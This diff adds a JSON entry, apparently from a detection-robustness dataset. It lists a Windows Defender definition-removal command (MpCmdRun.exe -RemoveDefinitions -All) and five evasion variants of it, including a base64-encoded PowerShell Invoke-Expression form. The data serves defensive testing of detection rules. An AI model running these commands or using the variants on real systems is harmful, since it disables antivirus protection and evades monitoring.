@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_mpcmdrun_remove_windows_defender_definition_0",
+  "original_command": "\\MpCmdRun.exe MpCmdRun.exe -RemoveDefinitions -All",
+  "evasions": {
+    "insertion": "\\MpCmdRun.exe MpCmdRun.exe \\\"-RemoveDefinitions\\\" \\\"-All\\\"",
+    "substitution": "\\MpCmdRun.exe MpCmdRun.exe -RemoveDefinitions -All #substitution",
+    "omission": "\\MpCmdRun MpCmdRun -RemoveDefinitions -All",
+    "reordering": "\\MpCmdRun.exe MpCmdRun.exe -All -RemoveDefinitions",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XE1wQ21kUnVuLmV4ZSBNcENtZFJ1bi5leGUgLVJlbW92ZURlZmluaXRpb25zIC1BbGw=')) | Invoke-Expression\" "
+  }
+}
